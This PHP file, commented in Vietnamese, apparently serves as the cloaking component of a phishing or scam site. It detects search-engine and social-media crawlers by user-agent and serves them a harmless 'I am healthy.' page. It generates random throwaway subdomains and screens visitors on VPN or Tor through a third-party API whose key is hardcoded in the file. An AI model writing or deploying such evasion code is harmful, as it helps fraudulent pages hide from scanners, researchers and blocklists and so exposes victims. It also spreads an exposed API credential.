<?php
function is_bot($ua) {
    $botRegex = '/(googlebot|adsbot|bingbot|facebookexternalhit|facebot|twitterbot|slackbot|discordbot|applebot|linkedinbot|google-adwords|google-ads|googlebot-image|googlebot-mobile|googlebot-news|googlebot-video|mediapartners-google|adsbot-google|apis-google|duckduckbot|baiduspider|yandexbot|sogou|exabot|ia_archiver|archive\.org_bot|msnbot|ahrefsbot|semrushbot|dotbot|rogerbot|mj12bot|spbot|semrushbot|ahrefsbot|dotbot|rogerbot|mj12bot|spbot|semrushbot|ahrefsbot|dotbot|rogerbot|mj12bot|spbot)/i';
    return preg_match($botRegex, $ua);
}

// ✅ Hàm random subdomain động
function get_random_subdomain($domain) {
    $chars = 'abcdefghijklmnopqrstuvwxyz';
    $nums = '0123456789';
    $subdomain = '';

    $length = rand(1, 2); // 1 hoặc 2 chữ cái
    for ($i = 0; $i < $length; $i++) {
        $subdomain .= $chars[rand(0, strlen($chars) - 1)];
    }
    $subdomain .= $nums[rand(0, strlen($nums) - 1)];

    return $subdomain .'.'. $domain; // ✨ Bạn thay "domain.com" thành domain bạn muốn
}

function clean_response() {
    header('Content-Type: text/plain; charset=UTF-8');
    header('Cache-Control: no-store');
    http_response_code(200);
    echo "I am healthy.";
    exit;
}

function isVpnOrTor($ip) {
    $url = "https://blackbox.p.rapidapi.com/v1/" . $ip;

    $curl = curl_init();

    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "GET",
        CURLOPT_HTTPHEADER => [
            "x-rapidapi-host: blackbox.p.rapidapi.com",
            "x-rapidapi-key: ade9946a79mshf55447e4de21eb2p1838c5jsn911d199d2f63" // thay bằng API key riêng nếu có
        ],
    ]);

    $res = curl_exec($curl);
    $err = curl_error($curl);
    curl_close($curl);

    if ($err) return false;
    if ($res !== null && trim($res) === 'Y') {
        return true;
    }

    return false;
}
?>
